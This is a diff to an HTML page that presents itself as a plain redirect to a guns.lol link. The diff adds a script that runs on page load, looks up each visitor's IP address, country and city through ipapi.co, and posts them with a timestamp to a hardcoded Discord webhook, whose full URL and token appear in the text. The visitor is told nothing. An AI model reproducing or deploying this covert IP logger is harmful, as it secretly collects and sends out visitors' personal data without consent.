@@ -4,6 +4,36 @@
   <meta charset="UTF-8">
   <meta http-equiv="refresh" content="0; url=https://guns.lol/1y.">
   <title>Redirect</title>
+
+  <script>
+    // جلب معلومات الزائر (IP + الدولة + المدينة)
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const country = data.country_name;
+        const city = data.city;
+        const dateTime = new Date().toLocaleString();
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1456621454933229681/R949Wvw73xTuOzz9jEQKJXC3cpmVifelhZQOXP-D8OZTxZ-pSQHKmbOZes3HGjQdwMnW';
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content:
+`📥 **New Visitor Logged**
+🌐 **IP:** ${ip}
+🏙️ **Location:** ${country} - ${city}
+🕒 **Time:** ${dateTime}`
+          })
+        });
+      })
+      .catch(err => console.error(err));
+  </script>
+
 </head>
 <body>
 </body>
